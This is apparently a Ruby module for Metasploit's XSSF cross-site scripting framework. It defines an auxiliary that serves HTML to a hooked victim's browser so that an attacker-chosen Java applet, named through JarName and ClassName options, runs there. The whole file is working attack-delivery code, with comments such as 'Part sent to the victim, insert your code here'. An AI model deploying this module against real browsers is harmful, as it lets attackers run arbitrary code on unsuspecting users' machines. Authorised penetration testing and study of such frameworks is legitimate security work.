require 'msf/core'
require 'msf/base/xssf'

#
# READ README_XSSF FILE FOR MORE INFORMATION ABOUT MODULES
#
class Metasploit3 < Msf::Auxiliary
	include Msf::Xssf::XssfServer
	
	# Module initialization
	def initialize(info = {})
		super(update_info(info,
			'Name'        => 'Java applet loader',
			'Description' => 'Loads a java applet and runs it on victims browser'
		))
		
		register_options(
			[
				OptString.new('JarName', [false, "Name of the jar to load (if there is a .jar, without .jar, included in '/data/xssf/resources/')"]),
				OptString.new('ClassName', [true, "Name of the class to load (without .class, included in '/data/xssf/resources/')", 'WireframeViewer']),
				OptInt.new('AppletWidth', [true, 'Width of the applet on web page', 300]),
				OptInt.new('AppletHeight', [true, 'Height of the applet on web page', 300])
			], self.class
		)
	end
	
	# Part sent to the victim, insert your code here !!!
	def on_request_uri(cli, req)	
		if (datastore['JarName'])
			code = %Q{ <html><body><applet code="#{datastore['ClassName']}.class" codebase="resources/" archive="#{datastore['JarName']}.jar" width="600" height="95"></applet></body></html> }
		else
			code = %Q{	<html><body><applet code="#{datastore['ClassName']}.class"  codebase="resources/" width=300 height=100></applet></body></html>	}
		end

		send_response(cli, code)
	end
end